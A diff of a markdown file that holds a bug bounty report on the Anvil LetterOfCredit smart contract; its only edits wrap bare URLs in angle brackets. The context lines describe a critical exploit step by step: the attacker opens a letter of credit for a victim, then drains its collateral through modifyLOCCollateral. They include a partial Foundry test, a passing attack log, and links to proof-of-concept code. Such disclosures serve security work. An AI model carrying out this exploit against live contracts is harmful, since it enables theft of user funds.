@@ -7,7 +7,7 @@
 * **Report ID:** #36931
 * **Report Type:** Smart Contract
 * **Report severity:** Critical
-* **Target:** https://github.com/AcronymFoundation/anvil-contracts/blob/main/contracts/LetterOfCredit.sol
+* **Target:** <https://github.com/AcronymFoundation/anvil-contracts/blob/main/contracts/LetterOfCredit.sol>
 * **Impacts:**
   * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
   * Protocol insolvency
@@ -114,7 +114,7 @@ It is easy to automate the attack
 
 ### Link to Proof of Concept
 
-https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testletterofcredit-sol
+<https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testletterofcredit-sol>
 
 ### Proof of Concept
 
@@ -126,7 +126,7 @@ Step 1: Attacker create a dynamicLOC for the victim with over-collaterized amoun
 
 Step 2: Attacker call modifyLOCCollateral to release almost all the collateral
 
-Test code to show: https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testletterofcredit-sol
+Test code to show: <https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testletterofcredit-sol>
 
 \`\`\`solidity function testModifyLOCCollateral() public {\
 setup\_precondition();
@@ -206,7 +206,7 @@ For this POC, the creator created the LOC with 1 WETH and the credit amount 1900
 
 Then the creator (attacker) modify the collateral of the LOC to withdraw almost all WETH, just left 2 wei in the LOC, but still backs the CreditedTOken amount of 1900 USDC
 
-Log: https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testmodifyloccollateral\_241120\_1040-log
+Log: <https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testmodifyloccollateral\\_241120\\_1040-log>
 
 \`\`\`Log Ran 1 test for test/testLetterOfCredit.sol:testLetterOfCredit \[PASS] testModifyLOCCollateral() (gas: 7835812) Logs: Setup Precondition for the test case Deploying LetterOfCredit Proxy contract that is VisibleBeaconProxy points to LetterOfCredit Initialize LetterOfCredit contract Approve the LetterOfCredit\_proxy as the collateralizable contract Balance of token before depositing: 1000000000000000000 Approve the CollateralVault\_contract to spend token to deposit Step: Deposit token to CollateralVault for the user Attacker to create a dynamic LOC for victim Mock Price Update for WETH/USDC Mock Price Update for WETH/USDC that is about 3000 USDC for 1 WETH Loc id 1 LOC Details: collateralTokenAddress 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 LOC Details: collateralTokenAmount 1000000000000000000 LOC Details: creditedTokenAddress 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 LOC Details: creditedTokenAmount 1900000000 Attacker to modify the collateral of the LOC After attack: LOC Details: collateralTokenAddress 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 After attack: LOC Details: collateralTokenAmount 2 After attack: LOC Details: creditedTokenAddress 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 After attack: LOC Details: creditedTokenAmount 1900000000 After attack: Balance of WETH for attacker: available 999999999999999998 After attack: Reserved of WETH for attacker: reserved 2
 
@@ -214,7 +214,7 @@ Log: https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe
 
 Just download the zip file:
 
-https://drive.google.com/file/d/1lKnqYK1Uk8Yp70CDTM\_1-J3yzx5Vjbb9/view?usp=sharing
+<https://drive.google.com/file/d/1lKnqYK1Uk8Yp70CDTM\\_1-J3yzx5Vjbb9/view?usp=sharing>
 
 The test code uses Foundry. Just Unzip and run the test case:
 
